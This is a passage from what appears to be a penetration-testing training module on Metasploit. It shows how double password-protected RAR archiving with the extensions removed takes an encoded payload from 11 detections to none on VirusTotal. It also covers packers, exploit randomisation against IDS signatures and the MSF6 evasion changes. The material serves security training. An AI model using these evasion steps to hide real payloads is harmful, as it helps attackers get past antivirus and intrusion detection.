[*] https://www.virustotal.com/en/about/terms-of-service/
[*] 
[*] If you prefer your own API key, you may obtain one at VirusTotal.

[*] Enter 'Y' to acknowledge: Y


[*] Using API key: &lt;API key&gt;
[*] Please wait while I upload test.js...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : <span class="hljs-number">35</span>e7687f0793dc3e048d557feeaf615a
[*] Sample SHA1 hash   : f2f1c4051d8e71df0741b40e4d91622c4fd27309
[*] Sample SHA256 hash : <span class="hljs-number">08799</span>c1b83de42ed43d86247ebb21cca95b100f6a45644e99b3394<span class="hljs-number">22b7b44105</span>
[*] Analysis link: https://www.virustotal.com/gui/file/&lt;SNIP&gt;/detection/f-&lt;SNIP&gt;-<span class="hljs-number">1652167047</span>
[*] Requesting the report...
[*] Received code <span class="hljs-number">0</span>. Waiting for another <span class="hljs-number">60</span> seconds...
[*] Analysis Report: test.js (<span class="hljs-number">11</span> / <span class="hljs-number">59</span>): &lt;...SNIP...&gt;
====================================================================================================

 Antivirus             Detected  Version               Result                             Update
 ---------             --------  -------               ------                             ------
 ALYac                 true      <span class="hljs-number">1.1.3.1</span>               Exploit.Metacoder.Shikata.Gen      <span class="hljs-number">20220510</span>
 AVG                   true      <span class="hljs-number">21.1.5827</span>.<span class="hljs-number">0</span>           Win32:ShikataGaNai-<span class="hljs-keyword">A</span> [Trj]         <span class="hljs-number">20220510</span>
 Acronis               false     <span class="hljs-number">1.2.0.108</span>                                                <span class="hljs-number">20220426</span>
 Ad-Aware              true      <span class="hljs-number">3.0.21.193</span>            Exploit.Metacoder.Shikata.Gen      <span class="hljs-number">20220510</span>
 AhnLab-V3             false     <span class="hljs-number">3</span>.<span class="hljs-number">21.3.10230</span>                                             <span class="hljs-number">20220510</span>
 Antiy-AVL             false     <span class="hljs-number">3</span>.<span class="hljs-number">0</span>                                                      <span class="hljs-number">20220510</span>
 Arcabit               false     <span class="hljs-number">1</span>.<span class="hljs-number">0.0.889</span>                                                <span class="hljs-number">20220510</span>
 Avast                 true      <span class="hljs-number">21.1.5827</span>.<span class="hljs-number">0</span>           Win32:ShikataGaNai-<span class="hljs-keyword">A</span> [Trj]         <span class="hljs-number">20220510</span>
 Avira                 false     <span class="hljs-number">8.3.3.14</span>                                                 <span class="hljs-number">20220510</span>
 Baidu                 false     <span class="hljs-number">1.0.0.2</span>                                                  <span class="hljs-number">20190318</span>
 BitDefender           true      <span class="hljs-number">7</span>.<span class="hljs-number">2</span>                   Exploit.Metacoder.Shikata.Gen      <span class="hljs-number">20220510</span>
 BitDefenderTheta      false     <span class="hljs-number">7.2.37796</span>.<span class="hljs-number">0</span>                                              <span class="hljs-number">20220428</span>
 Bkav                  false     <span class="hljs-number">1</span>.<span class="hljs-number">3.0.9899</span>                                               <span class="hljs-number">20220509</span>
 CAT-QuickHeal         false     <span class="hljs-number">14</span>.<span class="hljs-number">00</span>                                                    <span class="hljs-number">20220510</span>
 CMC                   false     <span class="hljs-number">2.10.2019</span>.<span class="hljs-number">1</span>                                              <span class="hljs-number">20211026</span>
 ClamAV                true      <span class="hljs-number">0.105.0.0</span>             Win.Trojan.MSShellcode-<span class="hljs-number">6360729-0</span>   <span class="hljs-number">20220509</span>
 Comodo                false     <span class="hljs-number">34607</span>                                                    <span class="hljs-number">20220510</span>
 Cynet                 false     <span class="hljs-number">4.0.0.27</span>                                                 <span class="hljs-number">20220510</span>
 Cyren                 false     <span class="hljs-number">6.5.1.2</span>                                                  <span class="hljs-number">20220510</span>
 DrWeb                 false     <span class="hljs-number">7</span>.<span class="hljs-number">0.56.4040</span>                                              <span class="hljs-number">20220510</span>
 ESET-NOD32            false     <span class="hljs-number">25243</span>                                                    <span class="hljs-number">20220510</span>
 Emsisoft              true      <span class="hljs-number">2021.5.0</span>.<span class="hljs-number">7597</span>         Exploit.Metacoder.Shikata.Gen (B)  <span class="hljs-number">20220510</span>
 F-Secure              false     <span class="hljs-number">18.10.978</span>.<span class="hljs-number">51</span>                                             <span class="hljs-number">20220510</span>
 FireEye               true      <span class="hljs-number">35.24.1.0</span>             Exploit.Metacoder.Shikata.Gen      <span class="hljs-number">20220510</span>
 Fortinet              false     <span class="hljs-number">6.2.142.0</span>                                                <span class="hljs-number">20220510</span>
 GData                 true      <span class="hljs-keyword">A</span>:<span class="hljs-number">25</span>.<span class="hljs-number">33002</span>B:<span class="hljs-number">27.27300</span>  Exploit.Metacoder.Shikata.Gen      <span class="hljs-number">20220510</span>
 Gridinsoft            false     <span class="hljs-number">1.0.77.174</span>                                               <span class="hljs-number">20220510</span>
 Ikarus                false     <span class="hljs-number">6.0.24.0</span>                                                 <span class="hljs-number">20220509</span>
 Jiangmin              false     <span class="hljs-number">16.0.100</span>                                                 <span class="hljs-number">20220509</span>
 K7AntiVirus           false     <span class="hljs-number">12.12.42275</span>                                              <span class="hljs-number">20220510</span>
 K7GW                  false     <span class="hljs-number">12.12.42275</span>                                              <span class="hljs-number">20220510</span>
 Kaspersky             false     <span class="hljs-number">21.0.1.45</span>                                                <span class="hljs-number">20220510</span>
 Kingsoft              false     <span class="hljs-number">2017.9.26</span>.<span class="hljs-number">565</span>                                            <span class="hljs-number">20220510</span>
 Lionic                false     <span class="hljs-number">7</span>.<span class="hljs-number">5</span>                                                      <span class="hljs-number">20220510</span>
 MAX                   true      <span class="hljs-number">2019.9.16</span>.<span class="hljs-number">1</span>           malware (ai score=<span class="hljs-number">89</span>)              <span class="hljs-number">20220510</span>
 Malwarebytes          false     <span class="hljs-number">4.2.2.27</span>                                                 <span class="hljs-number">20220510</span>
 MaxSecure             false     <span class="hljs-number">1.0.0.1</span>                                                  <span class="hljs-number">20220510</span>
 McAfee                false     <span class="hljs-number">6</span>.<span class="hljs-number">0.6.653</span>                                                <span class="hljs-number">20220510</span>
 McAfee-GW-Edition     false     v<span class="hljs-number">2019.1.2</span>+<span class="hljs-number">3728</span>                                           <span class="hljs-number">20220510</span>
 MicroWorld-eScan      true      <span class="hljs-number">14.0.409</span>.<span class="hljs-number">0</span>            Exploit.Metacoder.Shikata.Gen      <span class="hljs-number">20220510</span>
 Microsoft             false     <span class="hljs-number">1.1.19200</span>.<span class="hljs-number">5</span>                                              <span class="hljs-number">20220510</span>
 NANO-Antivirus        false     <span class="hljs-number">1.0.146</span>.<span class="hljs-number">25588</span>                                            <span class="hljs-number">20220510</span>
 Panda                 false     <span class="hljs-number">4.6.4.2</span>                                                  <span class="hljs-number">20220509</span>
 Rising                false     <span class="hljs-number">25.0.0.27</span>                                                <span class="hljs-number">20220510</span>
 SUPERAntiSpyware      false     <span class="hljs-number">5</span>.<span class="hljs-number">6.0.1032</span>                                               <span class="hljs-number">20220507</span>
 Sangfor               false     <span class="hljs-number">2.14.0.0</span>                                                 <span class="hljs-number">20220507</span>
 Sophos                false     <span class="hljs-number">1.4.1.0</span>                                                  <span class="hljs-number">20220510</span>
 Symantec              false     <span class="hljs-number">1.17.0.0</span>                                                 <span class="hljs-number">20220510</span>
 TACHYON               false     <span class="hljs-number">2022-05-10</span>.<span class="hljs-number">02</span>                                            <span class="hljs-number">20220510</span>
 Tencent               false     <span class="hljs-number">1.0.0.1</span>                                                  <span class="hljs-number">20220510</span>
 TrendMicro            false     <span class="hljs-number">11</span>.<span class="hljs-number">0.0.1006</span>                                              <span class="hljs-number">20220510</span>
 TrendMicro-HouseCall  false     <span class="hljs-number">10</span>.<span class="hljs-number">0.0.1040</span>                                              <span class="hljs-number">20220510</span>
 VBA32                 false     <span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>                                                    <span class="hljs-number">20220506</span>
 ViRobot               false     <span class="hljs-number">2014.3.20</span>.<span class="hljs-number">0</span>                                              <span class="hljs-number">20220510</span>
 VirIT                 false     <span class="hljs-number">9.5.191</span>                                                  <span class="hljs-number">20220509</span>
 Yandex                false     <span class="hljs-number">5.5.2.24</span>                                                 <span class="hljs-number">20220428</span>
 Zillya                false     <span class="hljs-number">2</span>.<span class="hljs-number">0.0.4627</span>                                               <span class="hljs-number">20220509</span>
 ZoneAlarm             false     <span class="hljs-number">1</span>.<span class="hljs-number">0</span>                                                      <span class="hljs-number">20220510</span>
 Zoner                 false     <span class="hljs-number">2.2.2.0</span>                                                  <span class="hljs-number">20220509</span>
</code></pre>
<p>Now, try archiving it two times, passwording both archives upon creation, and removing the <code>.rar</code>/<code>.zip</code>/<code>.7z</code> extension from their names. For this purpose, we can install the <a href="https://www.rarlab.com/download.htm">RAR utility</a> from RARLabs, which works precisely like WinRAR on Windows.</p>
<p><strong>Archiving the Payload</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ wget https:<span class="hljs-comment">//www.rarlab.com/rar/rarlinux-x64-612.tar.gz</span>
[!bash!]$ tar -xzvf rarlinux-x64-612.tar.gz &amp;&amp; <span class="hljs-keyword">cd</span> rar
[!bash!]$ rar a ~/<span class="hljs-keyword">test</span>.rar -p ~/<span class="hljs-keyword">test</span>.js

Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   <span class="hljs-keyword">Copyright</span> (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial <span class="hljs-keyword">version</span>             <span class="hljs-keyword">Type</span> 'rar -?' <span class="hljs-keyword">for</span> <span class="hljs-keyword">help</span>
Evaluation <span class="hljs-keyword">copy</span>. Please register.

Creating archive <span class="hljs-keyword">test</span>.rar
Adding    <span class="hljs-keyword">test</span>.js                                                     OK 
Done
</code></pre>
<pre><code class="lang-shell-session">[!bash!]$ <span class="hljs-keyword">ls</span>

<span class="hljs-keyword">test</span>.js   <span class="hljs-keyword">test</span>.rar
</code></pre>
<p><strong>Removing the .RAR Extension</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ mv test.rar test
[!bash!]$ ls

<span class="hljs-keyword">test   test</span>.js
</code></pre>
<p><strong>Archiving the Payload Again</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ rar a test2.rar -p <span class="hljs-keyword">test</span>

Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   <span class="hljs-keyword">Copyright</span> (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial <span class="hljs-keyword">version</span>             <span class="hljs-keyword">Type</span> 'rar -?' <span class="hljs-keyword">for</span> <span class="hljs-keyword">help</span>
Evaluation <span class="hljs-keyword">copy</span>. Please register.

Creating archive test2.rar
Adding    <span class="hljs-keyword">test</span>                                                        OK 
Done
</code></pre>
<p><strong>Removing the .RAR Extension</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ mv test2.rar test2
[!bash!]$ ls

<span class="hljs-keyword">test   test</span>2   test.js
</code></pre>
<p>The test2 file is the final .rar archive with the extension (.rar) deleted from the name. After that, we can proceed to upload it on VirusTotal for another check.</p>
<p><strong>VirusTotal</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ msf-virustotal -k &lt;API key&gt; -f test2

[*] Using API key: &lt;API key&gt;
[*] Please wait while I upload test2...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : <span class="hljs-number">2</span>f25eeeea28f737917e59177be61be6d
[*] Sample SHA1 hash   : c31d7f02cfadd87c430c2eadf77f287db<span class="hljs-number">4701429</span>
[*] Sample SHA256 hash : <span class="hljs-number">76</span>ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad
[*] Analysis link: https://www.virustotal.com/gui/file/&lt;SNIP&gt;/detection/f-&lt;SNIP&gt;-<span class="hljs-number">1652167804</span>
[*] Requesting the report...
[*] Received code <span class="hljs-number">0</span>. Waiting for another <span class="hljs-number">60</span> seconds...
[*] Received code -<span class="hljs-number">2</span>. Waiting for another <span class="hljs-number">60</span> seconds...
[*] Received code -<span class="hljs-number">2</span>. Waiting for another <span class="hljs-number">60</span> seconds...
[*] Received code -<span class="hljs-number">2</span>. Waiting for another <span class="hljs-number">60</span> seconds...
[*] Received code -<span class="hljs-number">2</span>. Waiting for another <span class="hljs-number">60</span> seconds...
[*] Received code -<span class="hljs-number">2</span>. Waiting for another <span class="hljs-number">60</span> seconds...
[*] Analysis Report: test2 (<span class="hljs-number">0</span> / <span class="hljs-number">49</span>): <span class="hljs-number">76</span>ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad
=================================================================================================

 Antivirus             Detected  Version         Result  Update
 ---------             --------  -------         ------  ------
 ALYac                 false     <span class="hljs-number">1.1.3.1</span>                 <span class="hljs-number">20220510</span>
 Acronis               false     <span class="hljs-number">1.2.0.108</span>               <span class="hljs-number">20220426</span>
 Ad-Aware              false     <span class="hljs-number">3.0.21.193</span>              <span class="hljs-number">20220510</span>
 AhnLab-V3             false     <span class="hljs-number">3</span>.<span class="hljs-number">21.3.10230</span>            <span class="hljs-number">20220510</span>
 Antiy-AVL             false     <span class="hljs-number">3</span>.<span class="hljs-number">0</span>                     <span class="hljs-number">20220510</span>
 Arcabit               false     <span class="hljs-number">1</span>.<span class="hljs-number">0.0.889</span>               <span class="hljs-number">20220510</span>
 Avira                 false     <span class="hljs-number">8.3.3.14</span>                <span class="hljs-number">20220510</span>
 BitDefender           false     <span class="hljs-number">7</span>.<span class="hljs-number">2</span>                     <span class="hljs-number">20220510</span>
 BitDefenderTheta      false     <span class="hljs-number">7.2.37796</span>.<span class="hljs-number">0</span>             <span class="hljs-number">20220428</span>
 Bkav                  false     <span class="hljs-number">1</span>.<span class="hljs-number">3.0.9899</span>              <span class="hljs-number">20220509</span>
 CAT-QuickHeal         false     <span class="hljs-number">14</span>.<span class="hljs-number">00</span>                   <span class="hljs-number">20220510</span>
 CMC                   false     <span class="hljs-number">2.10.2019</span>.<span class="hljs-number">1</span>             <span class="hljs-number">20211026</span>
 ClamAV                false     <span class="hljs-number">0.105.0.0</span>               <span class="hljs-number">20220509</span>
 Comodo                false     <span class="hljs-number">34606</span>                   <span class="hljs-number">20220509</span>
 Cynet                 false     <span class="hljs-number">4.0.0.27</span>                <span class="hljs-number">20220510</span>
 Cyren                 false     <span class="hljs-number">6.5.1.2</span>                 <span class="hljs-number">20220510</span>
 DrWeb                 false     <span class="hljs-number">7</span>.<span class="hljs-number">0.56.4040</span>             <span class="hljs-number">20220510</span>
 ESET-NOD32            false     <span class="hljs-number">25243</span>                   <span class="hljs-number">20220510</span>
 Emsisoft              false     <span class="hljs-number">2021.5.0</span>.<span class="hljs-number">7597</span>           <span class="hljs-number">20220510</span>
 F-Secure              false     <span class="hljs-number">18.10.978</span>.<span class="hljs-number">51</span>            <span class="hljs-number">20220510</span>
 FireEye               false     <span class="hljs-number">35.24.1.0</span>               <span class="hljs-number">20220510</span>
 Fortinet              false     <span class="hljs-number">6.2.142.0</span>               <span class="hljs-number">20220510</span>
 Gridinsoft            false     <span class="hljs-number">1.0.77.174</span>              <span class="hljs-number">20220510</span>
 Jiangmin              false     <span class="hljs-number">16.0.100</span>                <span class="hljs-number">20220509</span>
 K7AntiVirus           false     <span class="hljs-number">12.12.42275</span>             <span class="hljs-number">20220510</span>
 K7GW                  false     <span class="hljs-number">12.12.42275</span>             <span class="hljs-number">20220510</span>
 Kingsoft              false     <span class="hljs-number">2017.9.26</span>.<span class="hljs-number">565</span>           <span class="hljs-number">20220510</span>
 Lionic                false     <span class="hljs-number">7</span>.<span class="hljs-number">5</span>                     <span class="hljs-number">20220510</span>
 MAX                   false     <span class="hljs-number">2019.9.16</span>.<span class="hljs-number">1</span>             <span class="hljs-number">20220510</span>
 Malwarebytes          false     <span class="hljs-number">4.2.2.27</span>                <span class="hljs-number">20220510</span>
 MaxSecure             false     <span class="hljs-number">1.0.0.1</span>                 <span class="hljs-number">20220510</span>
 McAfee-GW-Edition     false     v<span class="hljs-number">2019.1.2</span>+<span class="hljs-number">3728</span>          <span class="hljs-number">20220510</span>
 MicroWorld-eScan      false     <span class="hljs-number">14.0.409</span>.<span class="hljs-number">0</span>              <span class="hljs-number">20220510</span>
 NANO-Antivirus        false     <span class="hljs-number">1.0.146</span>.<span class="hljs-number">25588</span>           <span class="hljs-number">20220510</span>
 Panda                 false     <span class="hljs-number">4.6.4.2</span>                 <span class="hljs-number">20220509</span>
 Rising                false     <span class="hljs-number">25.0.0.27</span>               <span class="hljs-number">20220510</span>
 SUPERAntiSpyware      false     <span class="hljs-number">5</span>.<span class="hljs-number">6.0.1032</span>              <span class="hljs-number">20220507</span>
 Sangfor               false     <span class="hljs-number">2.14.0.0</span>                <span class="hljs-number">20220507</span>
 Symantec              false     <span class="hljs-number">1.17.0.0</span>                <span class="hljs-number">20220510</span>
 TACHYON               false     <span class="hljs-number">2022-05-10</span>.<span class="hljs-number">02</span>           <span class="hljs-number">20220510</span>
 Tencent               false     <span class="hljs-number">1.0.0.1</span>                 <span class="hljs-number">20220510</span>
 TrendMicro-HouseCall  false     <span class="hljs-number">10</span>.<span class="hljs-number">0.0.1040</span>             <span class="hljs-number">20220510</span>
 VBA32                 false     <span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>                   <span class="hljs-number">20220506</span>
 ViRobot               false     <span class="hljs-number">2014.3.20</span>.<span class="hljs-number">0</span>             <span class="hljs-number">20220510</span>
 VirIT                 false     <span class="hljs-number">9.5.191</span>                 <span class="hljs-number">20220509</span>
 Yandex                false     <span class="hljs-number">5.5.2.24</span>                <span class="hljs-number">20220428</span>
 Zillya                false     <span class="hljs-number">2</span>.<span class="hljs-number">0.0.4627</span>              <span class="hljs-number">20220509</span>
 ZoneAlarm             false     <span class="hljs-number">1</span>.<span class="hljs-number">0</span>                     <span class="hljs-number">20220510</span>
 Zoner                 false     <span class="hljs-number">2.2.2.0</span>                 <span class="hljs-number">20220509</span>
</code></pre>
<p>As we can see from the above, this is an excellent way to transfer data both <code>to</code> and <code>from</code> the target host.</p>
<hr>
<h3 id="packers">Packers</h3>
<p>The term <code>Packer</code> refers to the result of an <code>executable compression</code> process where the payload is packed together with an executable program and with the decompression code in one single file. When run, the decompression code returns the backdoored executable to its original state, allowing for yet another layer of protection against file scanning mechanisms on target hosts. This process takes place transparently for the compressed executable to be run the same way as the original executable while retaining all of the original functionality. In addition, msfvenom provides the ability to compress and change the file structure of a backdoored executable and encrypt the underlying process structure.</p>
<p>A list of popular packer software:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://upx.github.io/">UPX packer</a></td>
<td><a href="https://enigmaprotector.com/">The Enigma Protector</a></td>
<td><a href="https://www.matcode.com/mpress.htm">MPRESS</a></td>
</tr>
<tr>
<td>Alternate EXE Packer</td>
<td>ExeStealth</td>
<td>Morphine</td>
</tr>
<tr>
<td>MEW</td>
<td>Themida</td>
</tr>
</tbody>
</table>
<p>If we want to learn more about packers, please check out the <a href="https://jon.oberheide.org/files/woot09-polypack.pdf">PolyPack project</a>.</p>
<hr>
<h3 id="exploit-coding">Exploit Coding</h3>
<p>When coding our exploit or porting a pre-existing one over to the Framework, it is good to ensure that the exploit code is not easily identifiable by security measures implemented on the target system.</p>
<p>For example, a typical <code>Buffer Overflow</code> exploit might be easily distinguished from regular traffic traveling over the network due to its hexadecimal buffer patterns. IDS / IPS placements can check the traffic towards the target machine and notice specific overused patterns for exploiting code.</p>
<p>When assembling our exploit code, randomization can help add some variation to those patterns, which will break the IPS / IDS database signatures for well-known exploit buffers. This can be done by inputting an <code>Offset</code> switch inside the code for the msfconsole module:</p>
<pre><code class="lang-ruby"><span class="hljs-string">'Targets'</span> =&gt;
[
     [ <span class="hljs-string">'Windows 2000 SP4 English'</span>, { <span class="hljs-string">'Ret'</span> =&gt; <span class="hljs-number">0x77e14c29</span>, <span class="hljs-string">'Offset'</span> =&gt; <span class="hljs-number">5093</span> } ],
],
</code></pre>
<p>Besides the BoF code, one should always avoid using obvious NOP sleds where the shellcode should land after the overflow is completed. Please note that the BoF code&#39;s purpose is to crash the service running on the target machine, while the NOP sled is the allocated memory where our shellcode (the payload) is inserted. IPS/IDS entities regularly check both of these, so it is good to test our custom exploit code against a sandbox environment before deploying it on the client network. Of course, we might only have one chance to do this correctly during an assessment.</p>
<p>For more information about exploit coding, we recommend checking out the <a href="https://nostarch.com/metasploit">Metasploit - The Penetration Tester&#39;s Guide</a> book from No Starch Press. They delve into quite some detail about creating our exploits for the Framework.</p>
<hr>
<h3 id="recompiling-meterpreter-from-source-code">Recompiling Meterpreter from Source Code</h3>
<p>Intrusion Prevention Systems and Antivirus Engines are the most common defender tools that can shoot down an initial foothold on the target. These mainly function on signatures of the whole malicious file or the stub stage.</p>
<hr>
<h3 id="a-note-on-evasion">A Note on Evasion</h3>
<p>This section covers evasion at a high level. Be on the lookout for later modules that will dig deeper into the theory and practical knowledge needed to perform evasion more effectively. It is worth trying some of these techniques out on older HTB machines or installing a VM with older versions of Windows Defender or free AV engines, and practicing evasion skills. This is a vast topic that cannot be covered adequately in a single section.</p>
<h2 id="metasploit-framework-updates-august-2020">Metasploit-Framework Updates - August 2020</h2>
<hr>
<p>Updating to MSF6 will render all previous payload sessions unusable if they were established using MSF5. Moreover, payloads generated using MSF5 will not work with MSF6 communication mechanisms. We have summarized the changes and additions that the August 2020 MSFconsole updates brought below.</p>
<hr>
<h3 id="generation-features">Generation Features</h3>
<ul>
<li>End to end encryption across Meterpreter sessions for all five implementations (Windows, Python, Java, Mettle, and PHP)</li>
<li>SMBv3 client support to further enable modern exploitation workflows</li>
<li>New polymorphic payload generation routine for Windows shellcode that improves evasive capabilities against common antivirus and intrusion detection system (IDS) products</li>
</ul>
<hr>
<h3 id="expanded-encryption">Expanded Encryption</h3>
<ul>
<li>Increased complexity for creation of signature-based detections for certain network operations and Metasploit’s main payload binaries</li>
<li>All Meterpreter payloads will use AES encryption during communication between the attacker and the target system</li>
<li>SMBv3 encryption integration will increase complexity for signature-based detections used to identify key operations performed over SMB</li>
</ul>
<hr>
<h3 id="cleaner-payload-artifacts">Cleaner Payload Artifacts</h3>
<ul>
<li>DLLs used by the Windows Meterpreter now resolve necessary functions by ordinal instead of name</li>
<li>The standard export ReflectiveLoader used by reflectively loadable DLLs is no longer present in the payload binaries as text data</li>
<li>Commands that Meterpreter exposes to the Framework are now encoded as integers instead of strings</li>
</ul>
<hr>
<h3 id="plugins">Plugins</h3>
<p>The old Mimikatz Meterpreter extension was removed in favor of its successor, Kiwi. Therefore, attempts to load Mimikatz will load Kiwi for the foreseeable future.</p>
<hr>
<h3 id="payloads">Payloads</h3>
<p>Replaced the shellcode static generation routine with a randomization routine that adds polymorphic properties to this critical stub by shuffling instructions around each time. To read more about these changes and see the full changelog, please <a href="https://blog.rapid7.com/2020/08/06/metasploit-6-now-under-active-development/">follow this link</a>.</p>
<hr>
<h3 id="closing-thoughts">Closing Thoughts</h3>
<p>As we have seen in this module, Metasploit is a powerful framework. Though often misused and mislabeled, it can be an important part of our penetration testing arsenal when used correctly. It is highly extensible great for tracking data during an assessment, and excellent for post-exploitation and facilitating pivoting. It is worth experimenting with all of the features Metasploit has to offer; you may find a way that it fits nicely into your workflow. If you prefer to avoid it, that&#39;s fine too! There are plenty of tools out there, and we should work with what we are most comfortable with. To get more practice with this tool, check out the HTB boxes tagged at the end of this module, or attempt any box or Academy module target using Metasploit. You can also practice with it (especially its power for pivoting) in the Dante Pro Lab.</p>
